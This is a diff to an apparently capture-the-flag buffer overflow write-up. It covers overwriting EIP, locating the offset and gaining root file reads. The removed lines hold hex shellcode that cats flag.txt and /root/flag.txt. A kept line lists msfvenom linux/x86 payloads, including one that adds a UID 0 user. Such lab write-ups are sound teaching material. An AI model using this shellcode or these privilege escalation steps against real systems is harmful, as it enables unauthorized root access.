@@ -59,9 +59,9 @@ If we inspect the registers we see what caused the segfault:
     fs             0x0	0
     gs             0x63	99
 
-- We've overwritten EIP.
+- We've overwritten Instruction Pointer (EIP).
 
-Now that we know we can overwrite the Instruction Pointer, lets see how many bytes it takes to reach EIP.
+Now that we know we can overwrite EIP, lets see how many bytes it takes to reach this pointer.
 
 - To do this well adjust the payload to a "x" number of A characters, and 4 B characters.
 
@@ -107,39 +107,7 @@ The stack size is: 0x22000
 
 Now that we know how to set EIP, lets exploit the program to read a file with root privileges.
 
-First lets start by generating shell code that can cat a file.
-
-- We can use pwntools for this: (https://docs.pwntools.com/en/stable/shellcraft/i386.html#pwnlib.shellcraft.i386.linux.cat)
-
-We'll need to make a flag to test the code:
-
-    echo "HTB{f4lS3_fLag}" > flag.txt
-
-Now use shellcodePwn.py to generatecode to read the file "flag.txt":
-
-    ./Documents/Scripts/shellcode.py
-    Shellcode contains N bytes: 44
-    
-    6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-
-Next, we'll test it:
-
-    ./shellcodeRun.py -s 6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-    Shellcode Output:
-    HTB{f4lS3_fLag}
-
-Now that it works, update "shellcodePwn.py" to read "/root/flag.txt":
-
-    ./Documents/Scripts/shellcode.py
-    Shellcode contains N bytes: 64
-    
-    48b801010101010101015048b860662f75797501014831042448b82f726f6f742f666c506a02584889e731f60f0541baffffff7f4889c66a28586a015f990f05
-
-
-
-# Payload:
-
-We'll use msfvenom to find a sutable exploit. Our target uses 32-bit registers so we'll need to filter for "linux/x86":
+First lets start by generating shell code that can cat a file. We'll use msfvenom to find a sutable exploit. Our target uses 32-bit registers so we'll need to filter for "linux/x86":
 
     msfvenom -l payloads | grep 'linux/x86'
         linux/x86/adduser     Create a new user with UID 0
